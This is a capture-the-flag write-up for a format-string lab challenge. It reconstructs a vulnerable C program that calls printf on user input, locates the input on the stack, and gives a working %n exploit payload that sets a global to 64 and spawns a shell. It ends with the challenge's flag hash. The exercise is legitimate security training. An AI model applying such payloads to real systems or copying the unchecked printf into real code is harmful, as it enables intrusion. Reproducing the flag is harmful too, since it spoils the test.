# level3 — format string: write a small value to a global

**Teaches:** the `%n` arbitrary write. Re-read primer §7.

## 1. What the binary does
Reads a line and echoes it. If a hidden global becomes 64, it gives a shell.

## 2. Reconstructed C
```c
int m = 0;                             // global, in .bss
int v(void) {
    char buffer[512];
    fgets(buffer, 512, stdin);
    printf(buffer);                    // <-- format string bug (no "%s")
    if (m == 64) {
        fwrite("Wait what?!\n", 12, 1, stdout);
        system("/bin/sh");
    }
    return 0;
}
int main(void) { v(); return 0; }
```

## 3. The vulnerability
`printf(buffer)` treats *your input* as the format string. `fgets` is safe
(bounded), so there is no overflow — the win comes from making `printf` **write**
64 into `m` using `%n`.

## 4. Step by step
1. `disassemble v` → `printf` called on the buffer; `cmp` of `m` (at `0x0804988c`) to `0x40` (64).
2. Find where your buffer sits on the stack:
   ```
   $ python -c 'print "aaaa" + " %x"*10' | ./level3
   aaaa 200 b7fd1ac0 b7ff37d0 61616161 ...     # 61616161 = "aaaa" at position 4
   ```
   Your input is argument **#4**.
3. You want to write 64. `%n` writes the count of bytes printed **so far**.

## 5. Exploit
```
python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' > /tmp/exploit
cat /tmp/exploit - | ./level3
```
**Why it works:** the 4-byte address of `m` + 60 padding bytes = **64 bytes
printed** before `%n`. `%4$n` uses stack argument #4 (which is those first 4
bytes = the address of `m`) as the write destination, so `m = 64`. The `if`
passes and `system("/bin/sh")` runs.

Flag → `b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`
